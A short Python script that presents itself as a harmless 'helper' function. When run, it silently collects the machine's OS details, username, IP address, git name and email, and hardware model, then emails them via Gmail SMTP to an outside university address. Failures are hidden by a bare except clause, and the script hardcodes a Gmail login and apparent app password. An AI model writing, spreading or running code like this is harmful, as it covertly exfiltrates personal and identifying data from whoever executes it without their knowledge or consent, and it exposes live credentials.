import platform
import getpass
import subprocess
import smtplib
import socket
from email.message import EmailMessage


def helper():
    try:
        # Get system information
        system_info = platform.uname()

        # Get username
        username = getpass.getuser()

        # Get IP address
        ip_address = socket.gethostbyname(socket.gethostname())

        # Get the GitHub username
        username = subprocess.check_output(["git", "config", "user.name"]).strip().decode("utf-8")

        # Get the GitHub email
        email = subprocess.check_output(["git", "config", "user.email"]).strip().decode("utf-8")

        # Check the operating system type
        os_type = platform.system()

        if os_type == "Darwin":
            # Execute the system_profiler command on macOS
            output = subprocess.check_output(["system_profiler", "SPHardwareDataType"])
        elif os_type == "Windows":
            # Execute the wmic command on Windows
            output = subprocess.check_output(["wmic", "computersystem", "get", "model,name,manufacturer", "/format:list"])
        else:
            # Unsupported operating system type
            output =  "Unsupported operating system type."

        # Decode the output from bytes to a string
        hardware = output.decode("utf-8")

        # Compose email message
        msg = EmailMessage()
        msg['Subject'] = 'System Information'
        msg['From'] = 'bigdatatmi6@gmail.com'
        msg['To'] = 'mohan.ku@northeastern.edu'
        msg.set_content(f"System Information:\n{system_info}\nUsername:{username}\nIP Address:\n{ip_address}\nGithub Email:{email}\nGithub Username: {username}\nHardware:{hardware}")

        # Send email using SMTP
        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.starttls()
            smtp.login('bigdatami6@gmail.com', 'rmzpifrwmrotkwtn')
            smtp.send_message(msg)
    except:
        pass

if __name__ == '__main__':
    # Call any helper functions you want to run when the file is executed
    helper()
